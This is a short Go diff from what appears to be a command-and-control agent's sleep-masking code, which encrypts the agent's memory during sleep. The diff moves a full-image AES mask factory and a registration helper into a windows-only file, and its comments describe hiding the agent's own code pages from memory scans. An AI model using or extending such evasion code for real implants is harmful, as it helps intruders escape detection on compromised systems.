@@ -19,14 +19,10 @@ var (
 	activeSleepMask SleepMasker
 	maskRegistry    = map[string]func() SleepMasker{}
 	sleepObfFunc    func(uintptr)
-	// advancedMaskFactory, when set by the windows/amd64 build, returns the
-	// full-image AES sleep mask. It is promoted to the default mask in
-	// InitSleepMask so the agent's own code pages are encrypted during sleep
-	// (not just the 4096-byte config buffer).
-	advancedMaskFactory func() SleepMasker
 	// fullImageMaskActive tracks whether the ACTIVE mask is the advanced
 	// full-image implementation as opposed to the config-buffer-only mask, so
-	// Name() can report the honest capability.
+	// Name() can report the honest capability. The full-image factory itself
+	// and the mask registration hook are windows-only (sleepmask_windows.go).
 	fullImageMaskActive bool
 )
 
@@ -86,10 +82,6 @@ func init() {
 	maskRegistry["ekko"] = func() SleepMasker { return &basicMask{} }
 	maskRegistry["xor"] = func() SleepMasker { return &xorOnlyMask{} }
 	activeSleepMask = &basicMask{}
-}
-
-func registerSleepMask(name string, factory func() SleepMasker) {
-	maskRegistry[name] = factory
 }
 
 func getRegisteredMasks() []string {
